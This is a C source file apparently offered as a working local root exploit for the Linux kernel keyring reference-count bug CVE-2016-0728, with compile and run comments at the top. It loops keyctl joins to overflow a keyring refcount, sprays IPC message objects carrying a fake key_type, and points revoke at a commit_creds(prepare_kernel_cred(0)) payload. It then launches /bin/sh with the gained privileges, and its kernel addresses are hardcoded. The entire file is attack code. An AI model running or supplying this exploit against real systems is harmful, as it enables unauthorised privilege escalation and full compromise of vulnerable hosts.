/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */
/* $ ./cve_2016_072 PP_KEY */

#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <keyutils.h>
#include <unistd.h>
#include <time.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
/* TODO the address */
_commit_creds commit_creds = (_commit_creds)0xffffffff8108b760;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)0xffffffff8108ba70;
struct key_type {
    const char *name;
    size_t def_datalen;
    void *vet_desc;
    void *preparse;
    void *free_preparse;
    void *instantiate;
    void *update;
    void *match_preparse;
    void *match_free;
    void *revoke;
    void *destroy;
};
static inline void doProgess( /*const char *string,*/ int step, int total ) {
    int width = 50;
    float percent = ( (float) step *  100 ) / (float) total;
    int c =(int) ( (percent / 100) * (float) width);
    //printf("%s ", string);
    printf("Progress: ");
    printf(" %3.2f%% [", percent);
    //load show bar
    int x;
    for (x = 0; x<c; x++) printf("=");
    for (x = c; x<width; x++) printf(" ");
    //go back to the previous line and clear it.
    printf("]\r");
    fflush(stdout);
}
int check_keyring(const char *name) {
//        char name[8] = "ggla";
        char in[512];
	char key_name[512];
//	unsigned long long refconut=0;
        FILE *fp = fopen("/proc/keys", "r");
        if(!fp) {
                perror("fopen");
                return -1;
        }
        while ( fgets(in, 1024, fp) != NULL ) {
                sscanf(in, "%*s%*s%*s%*s%*s%*s%*s%*s %[^:]", key_name);
                if (!strcmp(name,key_name)) {
                        fclose(fp);
  //                      sscanf(in, "%*s%*s %llu", refconut);
  //                      printf("%llu", refconut);
                        return 0;
                }
        }
        fclose(fp);
        return -1;
}
/* key_revoke(struct key *key) */
void exploit(void *key)
{
    commit_creds(prepare_kernel_cred(0));
}

int main(int argc, char *argv[])
{
    if (argc != 2) {
        fprintf(stderr, "usage: %s <key>", argv[0]);
        return -1;
    }

    int pid;
    size_t i = 0;
    unsigned long l = 0x100000000 >> 1;
    key_serial_t serial = -1;

    /* prepare key_type structure */
    struct key_type *m_key = malloc(sizeof(struct key_type));
    m_key->revoke = (void *)exploit;

    /* set msg_msg structure, is 0xb8 size */
    int msgid;
    struct msg_tail {
        long mtype;
        char mtext[0xb8-0x30];
    } msgp = {0x4141414141414141, {0}};

    memset(msgp.mtext, 'A', sizeof(msgp.mtext));
    *(int *)(&msgp.mtext[56]) = 0x3e8; //geteuid();/* key->uid */
 //   *(unsigned long *)(&msgp.mtext[72]) = 0x9;/* key->flag */
    *(int *)(&msgp.mtext[64]) = 0x3f3f3f3f;/* key->perm */
    *(unsigned long *)(&msgp.mtext[80]) = (unsigned long)m_key;
    if ((msgid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("[-] msgget");
        return -1;
    }

    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, argv[1]);
    if (serial < 0) {
        perror("keyctl");
        return -1;
    }

    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL |
           KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
        perror("keyctl");
        return -1;
    }

    printf("uid = %d, euid = %d\n", getuid(), geteuid());
    fprintf(stderr, "[+] increfs...\n");
    for (i = 1; i < 0xfffffffd; i++) {
        if (i == (0xffffffffUL - l)) {
            sleep(5);
            l >>= 1; //l = l/2;
        }
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, argv[1]) < 0) {
            perror("keyctl");
            return -1;
        }
//	doProgess(i,0xfffffffd);
    }
    sleep(5);

    for (i = 0; i < 3; i++) {
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, argv[1]) < 0) {
            perror("keyctl");
            return -1;
        }
    }
    fprintf(stderr, "[+] finish increfs\n");
    sleep(9);

    fprintf(stderr, "[+] fork...\n");
    for (i = 0; i < 64; i++) {
        pid = fork();
        if (pid == -1) {
            perror("[-] fork");
            return -1;
        }

        if (pid == 0) {
            sleep(2);
            if ((msgid = msgget(IPC_PRIVATE, 0644 |
                        IPC_CREAT)) == -1) {
                perror("[-] msgget");
                exit(1);
            }
            for (i = 0; i < 256; i++) {
                if (msgsnd(msgid, &msgp,
                       sizeof(msgp.mtext), 0) == -1) {
                    perror("[-] msgsnd");
                    exit(1);
                }
            }
            sleep(-1);
            exit(1);
        }
    }

    fprintf(stderr, "exploit...\n");
    assert(check_keyring(argv[1]));
    sleep(5);
    if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1)
        perror("[+] keyctl_revoke");

    printf("uid = %d, euid = %d\n", getuid(), geteuid());
    execl("/bin/sh", "/bin/sh", NULL);
    return 0;
}
